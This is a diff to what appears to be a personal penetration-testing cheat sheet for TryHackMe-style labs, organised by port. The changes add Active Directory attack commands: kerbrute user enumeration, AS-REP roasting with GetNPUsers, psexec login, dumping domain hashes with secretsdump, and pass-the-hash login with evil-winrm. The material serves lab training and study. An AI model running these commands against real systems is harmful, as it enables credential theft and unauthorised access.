@@ -570,14 +570,6 @@ Get the flag with developer console by checking the cookie.
 
 <figure><img src="../.gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>
 
-
-
-
-
-###
-
-
-
 ### Run Web server
 
 #### Kali
@@ -636,11 +628,31 @@ wpscan --url http://$VICTIM --passwords /usr/share/wordlists/rockyou.txt
 
 ## UDP/88 - Kerberos
 
-#### Username Enumeration
+### Username Enumeration
+
+Finds valid users
+
+**Examples**
+
+[attacktive-directory.md](../walkthroughs/tryhackme/attacktive-directory.md "mention")
 
 ```
 kerbrute/dist/kerbrute_linux_386 userenum --dc=$VICTIM -d=$commonName $ListOfUsernames.txt
 ```
+
+### Get Ticket
+
+**Examples**
+
+[attacktive-directory.md](../walkthroughs/tryhackme/attacktive-directory.md "mention")
+
+The hash type is Kerberos 5 etype 23 AS-REP.
+
+```
+python3.9 /opt/impacket/examples/GetNPUsers.py -no-pass -usersfile validusers.txt -dc-ip $VICTIM $commonName
+```
+
+
 
 ## **TCP/110 - POP3**
 
@@ -665,6 +677,21 @@ rpcclient -U '' $VICTIM
 srvinfo
 netshareenum # print the real file-path of shares; good for accurate RCE
 ```
+
+### **Login with credentials**
+
+**Examples**
+
+[gatekeeper.md](../walkthroughs/tryhackme/gatekeeper.md "mention")
+
+**Kali**
+
+```
+python3.9 /opt/impacket/build/scripts-3.9/psexec.py $USER@$VICTIM
+Password: $PASSWORD
+```
+
+##
 
 ## **TCP/139 - NetBIOS**
 
@@ -1183,22 +1210,35 @@ SELECT pg_ls_dir('/');
 
 ## **TCP/5985 - WinRM**
 
-Login with found username and password
+### **Dump Hashes**
+
+Dump hashes of other users if the user you have access to has the privilege's to do so. If it does we can potentially use these hashes with evil-winrm to login as these other users.
+
+**Examples**
+
+[attacktive-directory.md](../walkthroughs/tryhackme/attacktive-directory.md "mention")
+
+**Kali**
+
+```
+python3 /usr/local/bin/secretsdump.py  $DOMAIN/$USER:$PASSWORD@$VICTIM > allhashes.txt
+cat allhashes.txt | awk -F : '{print $1 ":" $3}' | sort | uniq
+```
+
+### Login with found username and password
 
 ```
 evil-winrm -u $USER -p $PASSWORD -i $VICTIM
 ```
 
-Login with found username and hash
+### Login with found username and hash
+
+**Examples**
+
+[attacktive-directory.md](../walkthroughs/tryhackme/attacktive-directory.md "mention")
 
 ```
 evil-winrm -i $VICTIM -u $VICTIMUSERNAME  -H $FOUNDHASH
-```
-
-Dump hashes of other users if the user you have access to has the privilege's to do so. If it does we can potentially use these hashes with evil-winrm to login as these other users.
-
-```
-python3 secretsdump.py  $DOMAIN/$USERNAME:$PASSWORD@$VICTIM
 ```
 
 ## TCP/6379 - Redis
